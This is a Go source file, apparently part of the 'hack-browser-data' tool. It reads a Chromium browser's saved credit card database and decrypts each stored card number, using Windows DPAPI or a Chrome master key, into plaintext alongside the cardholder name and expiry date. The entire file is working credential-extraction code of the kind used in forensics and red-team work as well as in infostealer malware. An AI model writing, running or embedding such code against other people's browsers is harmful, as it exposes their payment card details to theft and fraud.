package browingdata

import (
	"database/sql"
	"fmt"
	"os"

	_ "github.com/mattn/go-sqlite3"

	"hack-browser-data/internal/decrypter"
	"hack-browser-data/internal/item"
)

type ChromiumCreditCard []card

func (c *ChromiumCreditCard) Parse(masterKey []byte) error {
	creditDB, err := sql.Open("sqlite3", item.TempChromiumCreditCard)
	if err != nil {
		return err
	}
	defer os.Remove(item.TempChromiumCreditCard)
	defer creditDB.Close()
	rows, err := creditDB.Query(queryChromiumCredit)
	if err != nil {
		return err
	}
	defer rows.Close()
	for rows.Next() {
		var (
			name, month, year, guid string
			value, encryptValue     []byte
		)
		if err := rows.Scan(&guid, &name, &month, &year, &encryptValue); err != nil {
			fmt.Println(err)
		}
		creditCardInfo := card{
			GUID:            guid,
			Name:            name,
			ExpirationMonth: month,
			ExpirationYear:  year,
		}
		if masterKey == nil {
			value, err = decrypter.DPApi(encryptValue)
			if err != nil {
				return err
			}
		} else {
			value, err = decrypter.ChromePass(masterKey, encryptValue)
			if err != nil {
				return err
			}
		}
		creditCardInfo.CardNumber = string(value)
		*c = append(*c, creditCardInfo)
	}
	return nil
}
func (c *ChromiumCreditCard) Name() string {
	return "creditcard"
}
